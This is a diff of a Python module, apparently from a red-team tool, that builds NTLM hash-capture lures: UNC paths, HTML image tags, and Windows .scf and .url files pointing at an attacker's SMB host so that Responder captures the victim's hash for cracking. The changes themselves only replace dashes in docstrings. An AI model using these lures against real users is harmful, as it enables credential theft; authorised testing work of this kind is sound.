@@ -6,7 +6,7 @@ The resulting NetNTLMv2 auth is captured by the *same* Responder listener the `p
 command already runs and flows through the identical parse -> findings -> crack pipeline;
 this module only builds the lure.
 
-Pure string generation — no network, no subprocess, no external tool — so it unit-tests
+Pure string generation - no network, no subprocess, no external tool - so it unit-tests
 with nothing installed. The target file need not exist and the extension is cosmetic: it
 is the victim's SMB *connection attempt* that leaks the hash, not any file transfer.
 
@@ -21,7 +21,7 @@ from typing import Callable
 def unc_path(host: str, share: str = "share", filename: str = "x.jpg") -> str:
     r"""Build a Windows UNC path: `\\host\share\filename` (backslashes hardcoded).
 
-    Generation runs on any OS, so we never use os.sep — the path must be Windows-style
+    Generation runs on any OS, so we never use os.sep - the path must be Windows-style
     regardless of where REDNESS is running.
     """
     host = host.strip()
@@ -44,7 +44,7 @@ def html_img(unc: str) -> str:
 
 
 def scf_file(unc: str) -> str:
-    """Windows Explorer `.scf` — resolves `IconFile` on folder view, triggering auth."""
+    """Windows Explorer `.scf` - resolves `IconFile` on folder view, triggering auth."""
     return (
         "[Shell]\n"
         "Command=2\n"
@@ -55,7 +55,7 @@ def scf_file(unc: str) -> str:
 
 
 def url_file(unc: str) -> str:
-    """Windows `.url` internet shortcut — resolves `IconFile` on the UNC path."""
+    """Windows `.url` internet shortcut - resolves `IconFile` on the UNC path."""
     return (
         "[InternetShortcut]\n"
         "URL=http://localhost/\n"
